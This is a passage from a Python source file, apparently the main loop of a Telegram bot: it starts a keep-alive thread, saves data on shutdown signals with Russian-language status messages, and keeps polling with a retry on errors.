    keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()
    
    def signal_handler(sig, frame):
        print("\n⚠️ Сохраняю данные...")
        save_data()
        print("✅ Данные сохранены")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=30)
        except Exception as e:
            print(f"⚠️ Ошибка: {e}")
            time.sleep(5)